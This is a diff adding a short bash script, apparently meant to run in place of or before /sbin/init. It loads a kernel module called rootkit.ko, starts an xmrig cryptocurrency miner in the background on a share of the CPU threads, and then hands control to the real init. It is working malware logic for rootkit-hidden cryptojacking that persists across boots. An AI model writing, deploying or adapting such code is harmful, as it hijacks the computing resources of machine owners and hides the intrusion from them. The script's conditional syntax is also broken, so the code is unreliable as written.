@@ -1,0 +1,21 @@
+#!/bin/bash
+
+#need to get the place of the makefile to compile first
+#locations:
+#this script /sbin/script_rootkit.sh
+#rootkit .ko /lib/modules/$(uname -r)/extra/rootkit.ko
+#xmrig binary and config file /opt/xmrig/FILES
+
+#if extra not real then create it
+#copy compile rootkit.ko to destination
+insmod /lib/modules/$(uname -r)/extra/rootkit.ko
+
+
+threads=$(lscpu | awk -F: '/^CPU\(s\):/ {gsub(/^[ \t]+/, "", $2); print $2}')
+#check if min number of threads is six
+if [$threads -gt 6]
+	usable_threads=$((threads*20/100))
+	/opt/xmrig/xmrig --config=/opt/xmrig/config.json --threads=$usable_threads &
+fi
+
+exec /sbin/init "$@"
